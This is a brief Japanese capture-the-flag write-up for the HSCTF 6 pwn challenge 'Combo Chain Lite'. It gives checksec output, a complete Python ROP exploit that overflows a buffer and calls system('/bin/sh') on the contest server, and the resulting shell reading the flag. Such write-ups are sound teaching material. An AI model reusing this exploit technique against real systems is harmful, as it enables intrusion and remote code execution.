# [pwn 243pts] Combo Chain Lite - HSCTF 6
64ビットです。
```
$ checksec -f combo-chain-lite
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   72 Symbols     No	0		4	combo-chain-lite
```

systemの関数アドレスが貰える`/bin/sh`もあるので`system("/bin/sh")`するだけです。

```python
from ptrlib import *

elf = ELF("./combo-chain-lite")
#sock = Process("./combo-chain-lite")
sock = Socket("pwn.hsctf.com", 3131)

rop_pop_rdi = 0x00401273

sock.recvuntil(": ")
addr_system = int(sock.recvline().rstrip(), 16)
addr_binsh = 0x402051

payload = b'A' * 0x10
payload += p64(rop_pop_rdi)
payload += p64(addr_binsh)
payload += p64(addr_system)
sock.sendline(payload)

sock.interactive()
```

```
$ python solve.py 
[+] __init__: Successfully connected to pwn.hsctf.com:3131
[ptrlib]$ cat flag
Dude you hear about that new game called /bin/sh? Enter the right combo for some COMBO CARNAGE!: [ptrlib]$ hsctf{wheeeeeee_that_was_fun}
```

# 感想
簡単ですね。